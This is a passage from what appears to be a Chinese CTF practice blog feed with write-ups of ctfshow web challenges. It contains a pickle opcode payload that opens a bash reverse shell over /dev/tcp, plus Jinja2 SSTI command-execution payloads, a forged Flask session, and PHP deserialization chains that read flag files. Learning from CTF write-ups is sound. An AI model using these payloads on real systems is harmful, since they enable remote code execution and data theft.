的引用标识符，表示序列化对象的内部指针。<br>((lp1：<br><br>创建一个列表对象并开始填充数据。<br>Vbash\np2：序列化字符串 <span class="hljs-string">&quot;bash&quot;</span> 并保存到 p2。<br><br>V-c\np3：序列化字符串 <span class="hljs-string">&quot;-c&quot;</span> 并保存到 p3。<br><br>Vbash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1\np4：<br><br>序列化的反向 shell 命令，指向 /dev/tcp/ip/port。<br>bash -i：交互式启动 Bash。<br>&gt;&amp; /dev/tcp/ip/port：将标准输出和标准错误重定向到指定的 IP 和端口。<br>0&gt;&amp;1：将标准输入重定向。<br>atp5：<br><br>将上述序列化内容作为参数列表，最终存储到 p5。<br>Rp6.：<br><br>调用 subprocess.run 并执行该命令。<br></code></pre></td></tr></table></figure><p>payload2外带到app.py:</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">getattr = <span class="hljs-keyword">GLOBAL</span>(<span class="hljs-string">&#x27;builtins&#x27;</span>, <span class="hljs-string">&#x27;getattr&#x27;</span>)<br><br><span class="hljs-keyword">open</span> = <span class="hljs-keyword">GLOBAL</span>(<span class="hljs-string">&#x27;builtins&#x27;</span>, <span class="hljs-string">&#x27;open&#x27;</span>)<br>flag=<span class="hljs-keyword">open</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>)<br><span class="hljs-keyword">read</span>=getattr(flag, <span class="hljs-string">&#x27;read&#x27;</span>)<br>f=<span class="hljs-keyword">open</span>(<span class="hljs-string">&#x27;./app.py&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>)<br><span class="hljs-keyword">write</span>=getattr(f, <span class="hljs-string">&#x27;write&#x27;</span>)<br>fff=<span class="hljs-keyword">read</span>()<br><span class="hljs-keyword">write</span>(fff)<br><span class="hljs-keyword">return</span><br></code></pre></td></tr></table></figure><p>转化为opcode</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">b<span class="hljs-string">&#x27;&#x27;&#x27;cbuiltins</span><br><span class="hljs-string">getattr</span><br><span class="hljs-string">p0</span><br><span class="hljs-string">0cbuiltins</span><br><span class="hljs-string">open</span><br><span class="hljs-string">p1</span><br><span class="hljs-string">0g1</span><br><span class="hljs-string">(S&#x27;</span>/flag<span class="hljs-string">&#x27;</span><br><span class="hljs-string">tRp2</span><br><span class="hljs-string">0g0</span><br><span class="hljs-string">(g2</span><br><span class="hljs-string">S&#x27;</span><span class="hljs-keyword">read</span><span class="hljs-string">&#x27;</span><br><span class="hljs-string">tRp3</span><br><span class="hljs-string">0g1</span><br><span class="hljs-string">(S&#x27;</span>./app.py<span class="hljs-string">&#x27;</span><br><span class="hljs-string">S&#x27;</span>w<span class="hljs-string">&#x27;</span><br><span class="hljs-string">tRp4</span><br><span class="hljs-string">0g0</span><br><span class="hljs-string">(g4</span><br><span class="hljs-string">S&#x27;</span>writ<span class="hljs-string">e&#x27;</span><br><span class="hljs-string">tRp5</span><br><span class="hljs-string">0g3</span><br><span class="hljs-string">(tRp6</span><br><span class="hljs-string">0g5</span><br><span class="hljs-string">(g6</span><br><span class="hljs-string">tR.&#x27;</span><span class="hljs-string">&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p>解释：</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">cbuiltins<span class="hljs-symbol">\n</span>getattr<span class="hljs-symbol">\n</span>p0<span class="hljs-symbol">\n</span>：<br><br>c 表示导入模块，这里引用的是 Python 的内置模块 builtins。<br>getattr 用于获取指定对象的属性。<br>cbuiltins<span class="hljs-symbol">\n</span>open<span class="hljs-symbol">\n</span>p1<span class="hljs-symbol">\n</span>：<br><br>open 是 Python 的内置函数，用于打开文件。<br>0g1<span class="hljs-symbol">\n</span>(S&#x27;/flag&#x27;<span class="hljs-symbol">\n</span>tRp2<span class="hljs-symbol">\n</span>：<br><br>g1 引用之前序列化的 open 函数。<br>&#x27;/flag&#x27; 是文件路径，表示尝试打开 /flag 文件。<br>tR 调用 open 方法，返回一个文件对象（保存到 p2）。<br>0g0<span class="hljs-symbol">\n</span>(g2<span class="hljs-symbol">\n</span>S&#x27;read&#x27;<span class="hljs-symbol">\n</span>tRp3<span class="hljs-symbol">\n</span>：<br><br>使用 getattr 获取文件对象（g2 是 /flag 文件）的 read 方法。<br>tR 调用 read 方法，保存读取的内容到 p3。<br>0g1<span class="hljs-symbol">\n</span>(S&#x27;./app.py&#x27;<span class="hljs-symbol">\n</span>S&#x27;w&#x27;<span class="hljs-symbol">\n</span>tRp4<span class="hljs-symbol">\n</span>：<br><br>再次调用 open 函数，这次打开的是 ./app.py 文件，以写入模式 (w) 打开，返回文件对象（保存到 p4）。<br>0g0<span class="hljs-symbol">\n</span>(g4<span class="hljs-symbol">\n</span>S&#x27;write&#x27;<span class="hljs-symbol">\n</span>tRp5<span class="hljs-symbol">\n</span>：<br><br>使用 getattr 获取目标文件对象（p4）的 write 方法。<br>tR 返回 write 方法对象，保存到 p5。<br>0g5<span class="hljs-symbol">\n</span>(g6<span class="hljs-symbol">\n</span>tR.：<br><br>调用 write 方法，将之前读取的 /flag 文件内容写入 ./app.py 文件。<br>功能概述<br>反序列化此数据后，程序将执行以下操作：<br><br>打开 /flag 文件并读取其内容。<br>打开或创建 ./app.py 文件，以写入模式准备写入。<br>将 /flag 文件的内容写入到 ./app.py 文件中。<br></code></pre></td></tr></table></figure><p>自己对于pickle的反序列化和opcode的编写还不是很熟</p><p>还得练</p>]]></content>
    
    
    <categories>
      
      <category>每日一web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>opcode</tag>
      
      <tag>pickle</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2025.1.22</title>
    <link href="/2025/01/22/%E6%AF%8F%E6%97%A5%E4%B8%80web-2025-1-22/"/>
    <url>/2025/01/22/%E6%AF%8F%E6%97%A5%E4%B8%80web-2025-1-22/</url>
    
    <content type="html"><![CDATA[<h1 id="2023愚人杯easy-ssti"><a href="#2023愚人杯easy-ssti" class="headerlink" title="2023愚人杯easy-ssti"></a>2023愚人杯easy-ssti</h1><p>进入F12打开控制台提示下载app.zip</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> render_template_string,render_template<br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/hello/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hello</span>(<span class="hljs-params">name=<span class="hljs-literal">None</span></span>):<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;hello.html&#x27;</span>,name=name)<br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/hello/&lt;name&gt;&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hellodear</span>(<span class="hljs-params">name</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;ge&quot;</span> <span class="hljs-keyword">in</span> name:<br>        <span class="hljs-keyword">return</span> render_template_string(<span class="hljs-string">&#x27;hello %s&#x27;</span> % name)<br>    <span class="hljs-keyword">elif</span> <span class="hljs-string">&quot;f&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> name:<br>        <span class="hljs-keyword">return</span> render_template_string(<span class="hljs-string">&#x27;hello %s&#x27;</span> % name)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Nonononon&#x27;</span><br></code></pre></td></tr></table></figure><p>hello目录下有ssti</p><p>payload要有ge或者不能有f</p><p>尝试打</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;lipsum.__globals__[<span class="hljs-string">&#x27;os&#x27;</span>].popen(<span class="hljs-string">&#x27;ls /&#x27;</span>).read()&#125;&#125;<br></code></pre></td></tr></table></figure><p>但是 &#x2F; 被当作路由报错，尝试绕过，使用base64编码<strong>反引号</strong>执行命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">`<span class="hljs-built_in">echo</span> bHMgLw== | <span class="hljs-built_in">base64</span> -d`<br></code></pre></td></tr></table></figure><p>得到</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;lipsum.__globals__[<span class="hljs-string">&#x27;os&#x27;</span>].popen(<span class="hljs-string">&#x27;`echo bHMgLw== | base64 -d`&#x27;</span>).read()&#125;&#125;<br></code></pre></td></tr></table></figure><p>最后使用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;lipsum.__globals__[<span class="hljs-string">&#x27;os&#x27;</span>].popen(<span class="hljs-string">&#x27;`echo Y2F0IC9mbGFn | base64 -d`&#x27;</span>).read()&#125;&#125;<br></code></pre></td></tr></table></figure><p>拿到flag</p><h1 id="2023愚人杯easy-flask"><a href="#2023愚人杯easy-flask" class="headerlink" title="2023愚人杯easy-flask"></a>2023愚人杯easy-flask</h1><p>进入看见登录框尝试sql，xss，ssti没结果</p><p>发现admin账号提示密码错误，注册账号进去看看</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250122150714144.png" alt="1"></p><p>提示我们是user，再learn看见密码是S3cr3tK3y</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250122150747281.png" alt="image-20250122150747281"></p><p>爆破session,拿到</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs clean">&#123;<span class="hljs-string">&#x27;loggedin&#x27;</span>: <span class="hljs-literal">True</span>, <span class="hljs-string">&#x27;role&#x27;</span>: <span class="hljs-string">&#x27;user&#x27;</span>, <span class="hljs-string">&#x27;username&#x27;</span>: <span class="hljs-string">&#x27;1&#x27;</span>&#125;<br>-&gt; &#123;<span class="hljs-string">&#x27;loggedin&#x27;</span>: <span class="hljs-literal">True</span>, <span class="hljs-string">&#x27;role&#x27;</span>: <span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-string">&#x27;username&#x27;</span>: <span class="hljs-string">&#x27;1&#x27;</span>&#125;<br></code></pre></td></tr></table></figure><p>修改为admin用密钥加密,替换元素session</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">eyJsb2dnZWRpbiI6dHJ1ZSwicm9sZSI6ImFkbWluIiwidXNlcm5hbWUiOiIxIn0<span class="hljs-selector-class">.Z5CcCA</span>.IZ_i9nESqDbObpSXrK72b8-VfZ8<br></code></pre></td></tr></table></figure><p>伪造成功看见一个下载</p><p>​<img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250122152102290.png" alt="image-20250122152102290"></p><p>但是下载是一些没用的faskflag</p><p>抓包发现存在任意文件下载，下载源码看看&#x2F;app&#x2F;app.py绝对路径</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250122152504059.png" alt="image-20250122152504059"></p><p>发现hello目录存在rce</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/hello?<span class="hljs-built_in">eval</span>=__import__(<span class="hljs-string">&#x27;os&#x27;</span>).popen(<span class="hljs-string">&#x27;cat /flag_is_h3re &#x27;</span>).<span class="hljs-built_in">read</span>()<br></code></pre></td></tr></table></figure><p>导入os库拿到flag</p><h1 id="2023愚人杯easy-php"><a href="#2023愚人杯easy-php" class="headerlink" title="2023愚人杯easy-php"></a>2023愚人杯easy-php</h1><p>pop链，链子很简单，但是不能用O，a开头也就是不能用数组绕过</p><p>查了下资料，要用实现了<code>Serializable</code> 接口的原生类来构造</p><p>查找实现了serializable接口的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$classes</span> = <span class="hljs-title function_ invoke__">get_declared_classes</span>();<span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$classes</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$class</span>) &#123;<br><br>    <span class="hljs-variable">$methods</span> = <span class="hljs-title function_ invoke__">get_class_methods</span>(<span class="hljs-variable">$class</span>);<br><br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$methods</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$method</span>) &#123;<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$method</span>, <span class="hljs-keyword">array</span>(<br><br>            <span class="hljs-string">&#x27;unserialize&#x27;</span>,<br><br>        ))) &#123;<br><br>            <span class="hljs-keyword">print</span> <span class="hljs-variable">$class</span> . <span class="hljs-string">&#x27;::&#x27;</span> . <span class="hljs-variable">$method</span> . <span class="hljs-string">&quot;\n&quot;</span>;<br><br>        &#125;<br><br>    &#125;&#125;<br></code></pre></td></tr></table></figure><p>虽然在低版本的时候可以在Oa后面加+绕过但是这里不行，版本应该在7.4+</p><p>所有payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfshow</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ctfshow</span>;<br><br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> ctfshow;<br><span class="hljs-variable">$a</span>-&gt;ctfshow=<span class="hljs-string">&quot;ls /&quot;</span>;<br><span class="hljs-variable">$arr</span>=<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;evil&quot;</span>=&gt;<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$oa</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayObject</span>(<span class="hljs-variable">$arr</span>);<br><span class="hljs-variable">$res</span>=<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$oa</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$res</span>;<br><span class="hljs-meta">?&gt;</span>;<br></code></pre></td></tr></table></figure><blockquote><p>注意：不要再phpstorm运行代码，不然会以O开头在本地原始环境运行</p></blockquote><p>最终payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">C:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;ArrayObject&quot;</span>:<span class="hljs-number">78</span>:&#123;x:i:<span class="hljs-number">0</span>;a:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;evil&quot;</span>;O:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;ctfshow&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;ctfshow&quot;</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;cat /f*&quot;</span>;&#125;&#125;;m:a:<span class="hljs-number">0</span>:&#123;&#125;&#125;<br></code></pre></td></tr></table></figure><h2 id="解释为什么不会触发-wakeup"><a href="#解释为什么不会触发-wakeup" class="headerlink" title="解释为什么不会触发__wakeup()"></a>解释为什么不会触发__wakeup()</h2><p>O标识符代表对象类型，而C标识符代表类名类型。如果将C替换为O，则在反序列化时会将其解释为一个新的类名字符串，从而创建一个新的类而不是对象。因为这个新的类没有被序列化过，所以它没有任何属性或方法。这样一来，在反序列化时，__wakeup魔术方法就不会触发，简单来说就是wakeup只对对象有效</p><h1 id="2023愚人杯被遗忘的反序列化"><a href="#2023愚人杯被遗忘的反序列化" class="headerlink" title="2023愚人杯被遗忘的反序列化"></a>2023愚人杯被遗忘的反序列化</h1><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment"># 当前目录中有一个txt文件哦</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;check.php&quot;</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">EeE</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$text</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$eeee</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;text == <span class="hljs-string">&quot;aaaa&quot;</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">lcfirst</span>(<span class="hljs-variable">$this</span>-&gt;text);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$kk</span></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$kk</span>,eeeeeeeeeeeee&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__clone</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> cycycycy;<br>        <span class="hljs-variable">$a</span> -&gt; <span class="hljs-title function_ invoke__">aaa</span>();<br>    &#125;<br>    <br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">cycycycy</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$b</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">aaa</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$get</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;get&#x27;</span>];<br>        <span class="hljs-variable">$get</span> = <span class="hljs-title function_ invoke__">cipher</span>(<span class="hljs-variable">$get</span>);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$get</span> === <span class="hljs-string">&quot;p8vfuv8g8v8py&quot;</span>)&#123;<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;eval&quot;</span>]);<br>        &#125;<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$a_a</span> = <span class="hljs-variable language_">$this</span> -&gt; a;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\$a_a\$&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">gBoBg</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$coos</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$eeee</span>=<span class="hljs-string">&quot;-_-&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;name))&#123;<br>            <span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">coos</span>(<span class="hljs-variable">$this</span>-&gt;file);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br>        &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span> -&gt; file))&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;coos-&gt;name;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$aa</span> = <span class="hljs-variable language_">$this</span>-&gt;coos;<br>            <span class="hljs-variable">$bb</span> = <span class="hljs-variable language_">$this</span>-&gt;file;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$aa</span>();<br>        &#125;<br>    &#125;<br>&#125;   <br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">w_wuw_w</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$aaa</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/php|63|\*|\?/i&quot;</span>,<span class="hljs-variable">$this</span> -&gt; key))&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;key = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span> -&gt; file);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;不行哦&quot;</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;aaa;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span> -&gt; aaa = <span class="hljs-keyword">clone</span> <span class="hljs-keyword">new</span> EeE;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$_ip</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;HTTP_AAAAAA&quot;</span>];<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_ip</span>);<br></code></pre></td></tr></table></figure><p>首先是通过header头传参的 比较新奇</p><p>好多函数没定义肯定先要读.txt文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">gBoBg</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$coos</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$eeee</span>=<span class="hljs-string">&quot;-_-&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;name))&#123;<br>            <span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">coos</span>(<span class="hljs-variable">$this</span>-&gt;file);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br>        &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span> -&gt; file))&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;coos-&gt;name;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$aa</span> = <span class="hljs-variable 